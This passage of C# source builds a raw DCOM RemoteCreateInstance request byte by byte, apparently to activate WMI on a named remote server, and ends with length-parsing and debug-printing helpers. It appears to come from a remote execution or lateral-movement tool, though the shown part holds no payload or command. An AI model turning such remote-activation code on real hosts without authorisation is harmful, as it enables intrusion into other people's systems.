            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFCLSID", new byte[] { 0x38, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFCBExtension", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFSize", packet_size);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesTotalSize", packet_total_size);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesReserved", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCommonHeader", new byte[] { 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderPrivateHeader", new byte[] { 0xb0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderTotalSize", packet_total_size);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderCustomHeaderSize", new byte[] { 0xc0, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesCustomHeaderReserved", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesDestinationContext", new byte[] { 0x02, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesNumActivationPropertyStructs", new byte[] { 0x06, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsInfoClsid", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrReferentID", new byte[] { 0x00, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrReferentID", new byte[] { 0x04, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesNULLPointer", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrMaxCount", new byte[] { 0x06, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid", new byte[] { 0xb9, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid2", new byte[] { 0xab, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid3", new byte[] { 0xa5, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid4", new byte[] { 0xa6, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid5", new byte[] { 0xa4, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsIdPtrPropertyStructGuid6", new byte[] { 0xaa, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrMaxCount", new byte[] { 0x06, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize", new byte[] { 0x68, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize2", new byte[] { 0x58, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize3", new byte[] { 0x90, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize4", packet_property_data_size);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize5", new byte[] { 0x20, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesClsSizesPtrPropertyDataSize6", new byte[] { 0x30, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesCommonHeader", new byte[] { 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPrivateHeader", new byte[] { 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesSessionID", new byte[] { 0xff, 0xff, 0xff, 0xff });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesRemoteThisSessionID", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesClientImpersonating", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionIDPresent", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesDefaultAuthnLevel", new byte[] { 0x02, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesPartitionGuid", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesProcessRequestFlags", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesOriginalClassContext", new byte[] { 0x14, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesFlags", new byte[] { 0x02, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesReserved", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSpecialSystemPropertiesUnusedBuffer", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoCommonHeader", new byte[] { 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoPrivateHeader", new byte[] { 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiatedObjectClsId", new byte[] { 0x5e, 0xf0, 0xc3, 0x8b, 0x6b, 0xd8, 0xd0, 0x11, 0xa0, 0x75, 0x00, 0xc0, 0x4f, 0xb6, 0x88, 0x20 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoClassContext", new byte[] { 0x14, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoActivationFlags", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoFlagsSurrogate", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInterfaceIdCount", new byte[] { 0x01, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInfoInstantiationFlag", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtr", new byte[] { 0x00, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationEntirePropertySize", new byte[] { 0x58, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMajor", new byte[] { 0x05, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationVersionMinor", new byte[] { 0x07, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsPtrMaxCount", new byte[] { 0x01, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIds", new byte[] { 0x18, 0xad, 0x09, 0xf3, 0x6a, 0xd8, 0xd0, 0x11, 0xa0, 0x75, 0x00, 0xc0, 0x4f, 0xb6, 0x88, 0x20 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesInstantiationInterfaceIdsUnusedBuffer", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoCommonHeader", new byte[] { 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoPrivateHeader", new byte[] { 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientOk", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved2", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoReserved3", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrReferentID", new byte[] { 0x00, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoNULLPtr", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextUnknown", new byte[] { 0x60, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextCntData", new byte[] { 0x60, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFSignature", new byte[] { 0x4d, 0x45, 0x4f, 0x57 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFFlags", new byte[] { 0x04, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFIID", new byte[] { 0xc0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCLSID", new byte[] { 0x3b, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFCBExtension", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoClientPtrClientContextOBJREFCUSTOMOBJREFSize", new byte[] { 0x30, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesActivationContextInfoUnusedBuffer", new byte[] { 0x01, 0x00, 0x01, 0x00, 0x63, 0x2c, 0x80, 0x2a, 0xa5, 0xd2, 0xaf, 0xdd, 0x4d, 0xc4, 0xbb, 0x37, 0x4d, 0x37, 0x76, 0xd7, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoCommonHeader", new byte[] { 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoPrivateHeader", packet_private_header);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoAuthenticationFlags", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoPtrReferentID", new byte[] { 0x00, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoNULLPtr", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameReferentID", new byte[] { 0x04, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNULLPtr", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoReserved2", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameMaxCount", packet_target_length);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameOffset", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameActualCount", packet_target_length);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesSecurityInfoServerInfoServerInfoNameString", packet_target_unicode);
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoCommonHeader", new byte[] { 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoPrivateHeader", new byte[] { 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoNULLPtr", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoProcessID", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoApartmentID", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesLocationInfoContextID", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoCommonHeader", new byte[] { 0x01, 0x10, 0x08, 0x00, 0xcc, 0xcc, 0xcc, 0xcc });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoPrivateHeader", new byte[] { 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoNULLPtr", new byte[] { 0x00, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrReferentID", new byte[] { 0x00, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestClientImpersonationLevel", new byte[] { 0x02, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestNumProtocolSequences", new byte[] { 0x01, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestUnknown", new byte[] { 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrReferentID", new byte[] { 0x04, 0x00, 0x02, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrMaxCount", new byte[] { 0x01, 0x00, 0x00, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoRemoteRequestPtrRemoteRequestProtocolSeqsArrayPtrProtocolSeq", new byte[] { 0x07, 0x00 });
            packet_DCOMRemoteCreateInstance.Add("DCOMRemoteCreateInstance_IActPropertiesCUSTOMOBJREFIActPropertiesPropertiesScmRequestInfoUnusedBuffer", new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            return packet_DCOMRemoteCreateInstance;
        }
        private static ushort DataLength2(int length_start, byte[] string_extract_data)
        {
            byte[] bytes = { string_extract_data[length_start], string_extract_data[length_start + 1] };
            ushort string_length = BitConverter.ToUInt16(getByteRange(string_extract_data,length_start,length_start+1), 0);
            //string_length = ConvertToUint16(array[arraystart to arraystart +1

            return string_length;
        }
        private static void PrintByteArray(byte[] thebizz, string location)
        {
            Console.WriteLine("Debugging output for: " + location);
            for (int i = 0; i < thebizz.Length; ++i)
            {
                Console.Write("{0:X2}" + " ", thebizz[i]);
            }

            Console.WriteLine("\n*******************");
        }
    }
}
